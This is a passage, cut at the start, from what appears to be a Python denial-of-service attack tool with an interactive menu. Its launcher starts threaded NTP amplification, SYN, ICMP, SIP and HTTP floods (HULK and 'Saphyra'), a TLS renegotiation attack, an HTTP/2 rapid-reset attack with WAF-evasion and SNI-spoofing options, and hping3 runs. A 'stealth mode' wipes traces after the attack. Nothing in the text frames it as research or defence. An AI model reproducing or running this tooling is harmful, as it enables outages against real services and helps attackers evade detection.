                t2 = threading.Thread(target=ntp_amplify, args=(TARGET_IP, ntp_refs, COUNT, INTERVAL))
                threads.extend([t1, t2])
                t1.start(); t2.start()

    if 'tcp' in ATTACK_MODES:
        if not HAS_SCAPY:
            print(colored("[!] TCP SYN flood disabled – scapy missing.", 'red'))
        else:
            port = int(input("TCP target port (80/443): "))
            for _ in range(THREADS):
                t = threading.Thread(target=tcp_syn_flood, args=(TARGET_IP, port, COUNT, INTERVAL))
                threads.append(t); t.start()

    if 'icmp' in ATTACK_MODES:
        if not HAS_SCAPY:
            print(colored("[!] ICMP flood disabled – scapy missing.", 'red'))
        else:
            for _ in range(THREADS):
                t = threading.Thread(target=icmp_flood, args=(TARGET_IP, COUNT, INTERVAL))
                threads.append(t); t.start()

    if 'sip' in ATTACK_MODES:
        if not HAS_SCAPY:
            print(colored("[!] SIP flood disabled – scapy missing.", 'red'))
        else:
            port = int(input("SIP target port (default 5060): ") or 5060)
            for _ in range(THREADS):
                t = threading.Thread(target=sip_invite_flood, args=(TARGET_IP, port, COUNT, INTERVAL))
                threads.append(t); t.start()

    if 'tls' in ATTACK_MODES:
        port = int(input("TLS target port (default 443): ") or 443)
        t = threading.Thread(target=tls_renegotiation_attack, args=(TARGET_IP, port, COUNT, INTERVAL, SNI_SPOOF))
        threads.append(t); t.start()

    if 'http2' in ATTACK_MODES:
        if not HAS_REQUESTS or not HAS_H2:
            print(colored("[!] HTTP/2 disabled – requests or h2 missing.", 'red'))
        else:
            t = threading.Thread(target=http2_rapid_reset_evasive, args=(TARGET_IP, COUNT, 443, USE_FLARE, SNI_SPOOF, PAYLOAD, WAF_TAMPER))
            threads.append(t); t.start()

    if 'hulk' in ATTACK_MODES:
        if not HAS_REQUESTS:
            print(colored("[!] HTTP HULK disabled – requests missing.", 'red'))
        else:
            use_https = input("Use HTTPS? (yes/no): ").lower() == 'yes'
            port = int(input("Port (80/443): "))
            for _ in range(THREADS):
                t = threading.Thread(target=http_hulk_flood, args=(TARGET_IP, port, COUNT, INTERVAL, use_https))
                threads.append(t); t.start()

    if 'saphyra' in ATTACK_MODES:
        if not SAPHYRA_USERAGENTS or not SAPHYRA_REFERERS:
            print(colored("[!] Saphyra flood disabled – lists not loaded.", 'red'))
        else:
            scheme = "https" if input("Use HTTPS? (yes/no): ").lower() == 'yes' else "http"
            port = int(input("Port (80/443): "))
            target_url = f"{scheme}://{TARGET_IP}:{port}"
            host = TARGET_DOMAIN if TARGET_DOMAIN != TARGET_IP else TARGET_IP
            saphyra_count = COUNT if COUNT > 0 else 0
            t = threading.Thread(target=saphyra_http_flood, args=(target_url, host, saphyra_count, INTERVAL))
            threads.append(t); t.start()

    if 'hping3' in ATTACK_MODES:
        hping_mode = get_input("hping3 mode (udp/syn/icmp)", default="udp")
        hping_port = int(get_input("hping3 port", default="80"))
        hping3_attack(TARGET_IP, hping_mode, hping_port, COUNT)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")

    elapsed = time.time() - start_time
    print(colored(f"\n[+] Attack finished in {elapsed:.2f} seconds.", 'green'))

    if STEALTH_MODE:
        wipe_traces()

# ================================================================
# MAIN
# ================================================================
def main():
    print_banner()
    # Show module availability
    print("\n[AVAILABLE MODULES]")
    print(f"  scapy       : {'✓' if HAS_SCAPY else '✗'}")
    print(f"  requests    : {'✓' if HAS_REQUESTS else '✗'}")
    print(f"  h2          : {'✓' if HAS_H2 else '✗'}")
    print(f"  termcolor   : {'✓' if HAS_TERMCOLOR else '✗ (colours disabled)'}")
    print(f"  cryptography: {'✓' if HAS_CRYPTO else '✗'}")
    print(f"  dnspython   : {'✓' if HAS_DNSPYTHON else '✗'}")
    print(f"  sphyra.txt  : {'✓' if SAPHYRA_USERAGENTS else '✗'}")
    print()

    while True:
        print("\n" + "="*50)
        print("MAIN MENU")
        print("1. Configure Attack")
        print("2. Launch Attack")
        print("3. Show Config")
        print("4. Exit")
        choice = input("Select option: ").strip()
        if choice == '1':
            configure_attack()
        elif choice == '2':
            if not TARGET_IP:
                print("[!] Configure first.")
                continue
            launch_attack()
        elif choice == '3':
            print(f"\nTarget: {TARGET_DOMAIN} -> {TARGET_IP}")
            print(f"Modes: {ATTACK_MODES}")
            print(f"Threads: {THREADS}, Count: {COUNT}, Interval: {INTERVAL}")
            print(f"Proxy count: {len(PROXY_LIST)}")
            print(f"FlareSolverr: {USE_FLARE}, SNI: {SNI_SPOOF}")
            print(f"Stealth mode: {STEALTH_MODE}")
        elif choice == '4':
            print("Exiting.")
            sys.exit(0)
        else:
            print("Invalid.")

if __name__ == "__main__":
    main()